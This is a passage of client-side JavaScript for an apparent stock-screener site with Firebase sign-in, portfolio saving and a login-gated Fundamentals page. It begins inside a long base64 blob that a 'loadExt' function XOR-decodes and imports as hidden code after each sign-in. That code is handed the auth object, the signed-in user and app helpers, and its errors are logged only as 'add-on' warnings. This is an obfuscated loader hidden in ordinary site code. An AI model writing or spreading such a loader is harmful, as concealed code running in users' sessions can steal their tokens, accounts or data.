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";
function unpack(t) {
  const b = Uint8Array.from(atob(t), (c) => c.charCodeAt(0));
  for (let i = 0; i < b.length; i++) b[i] ^= (i * 7 + 13) & 255;
  return new TextDecoder().decode(b);
}
async function loadExt(u) {
  if (!PACK) return;
  const url = URL.createObjectURL(new Blob([unpack(PACK)], { type: "text/javascript" }));
  try {
    const m = await import(url);
    await m.default({ app, auth, user: u, gated: GATED, addItem, syncLock, esc, $ });
  } catch (e) { console.warn("add-on:", e); }
  finally { URL.revokeObjectURL(url); }
}
idle(presence);                                         // online counter: after the page has settled, never before it shows
idle(countVisitor, 4000);

// ---------- page wiring ----------
const SIGNED_HINT = "hni_signed";                          // "1" = signed in last time (only a hint: Fundamentals checks for real)
const hinted = () => { try { return localStorage.getItem(SIGNED_HINT) === "1"; } catch (e) { return false; } };
let current = null;
const ready = new Promise((resolve) => {
  onAuthStateChanged(auth, async (u) => {
    if (u && expired(u)) { await signOut(auth); u = null; }   // 7-day session limit
    current = u;
    try { localStorage.setItem(SIGNED_HINT, u ? "1" : "0"); } catch (e) {}   // lets the next visit open Fundamentals instantly
    resolve();
    if (GATED && !u) {                                        // no login: back to the screener with the popup open
      location.replace(HOME + "?login=" + encodeURIComponent(location.pathname.replace(/^\//, "") + location.hash));
      return;
    }
    if (GATED) document.documentElement.classList.add("auth-ok");   // show the page at once
    else paintSlot(u);                                         // screener: Login button or the user menu
    if (!u) return;
    // Portfolio tab: the page saves / loads the user's holdings through this (Firestore hni_portfolio/{uid}, owner only)
    window.hniStore = {
      load: async () => { await needFS(); const d = await getDoc(doc(db, PORTFOLIO, u.uid)); return d.exists() ? d.data() : {}; },             // {txns, rates} (or old {items})
      save: async (data) => { await needFS(); return setDoc(doc(db, PORTFOLIO, u.uid), { txns: data.txns || [], rates: data.rates || {}, updated: serverTimestamp() }); },
      market: async () => { await needFS(); const d = await getDoc(doc(db, ...MARKET)); return d.exists() ? d.data() : null; },
      canRefresh: () => !!LTP_HOOK,                          // every signed-in user
      // start the live-price job → {ok} | {error, running}
      refresh: async () => {
        const r = await fetch(LTP_HOOK, { method: "POST", headers: { Authorization: "Bearer " + await u.getIdToken() } });
        return r.json().catch(() => ({ error: "HTTP " + r.status }));
      },
    };
    window.dispatchEvent(new Event("hni-ready"));
    if (GATED) showUser(u);
    idle(() => { record(u); loadExt(u); }, 1500);
  });
});

if (!GATED) {
  // screener: the Fundamentals button. Its tap is caught by a small script in the page itself (so the FIRST tap works
  // even before this file has loaded): it disables the button, shows "Checking login…" and then calls this.
  window.hniAuthGo = async (href) => {
    window.hniPending = null;
    // signed in last time → go at once (the Fundamentals page confirms the login itself, and sends you back if needed)
    if (current || hinted()) { location.href = href; return; }
    await ready;
    if (current) { location.href = href; return; }
    if (window.hniDone) window.hniDone();                      // not signed in: "Checking login…" → the login box
    openPopup(href);
  };
  if (window.hniPending) window.hniAuthGo(window.hniPending);   // tapped while this file was still loading
  // signed-in visitors: fetch the Fundamentals page quietly in the background, so it opens instantly (not for everyone:
  // it is ~260 KB, and free hosting has a daily transfer limit)
  ready.then(() => {
    const c = navigator.connection;
    if (!current || (c && (c.saveData || /2g/.test(c.effectiveType || "")))) return;
    const a = document.querySelector("[data-auth-link]");
    if (!a) return;
    idle(() => { const l = document.createElement("link"); l.rel = "prefetch"; l.href = a.href; document.head.appendChild(l); }, 3000);
  });
  const want = new URLSearchParams(location.search).get("login");
  if (want != null) {
    history.replaceState(null, "", location.pathname + location.hash);          // clean the address bar
    ready.then(() => {
      let target = "fundamentals";                                              // only pages on this site
      try { const t = new URL(want, location.href); if (want && t.origin === location.origin) target = t.pathname + t.hash; } catch (e) {}
      if (current) location.href = target; else openPopup(target);
    });
  }
}
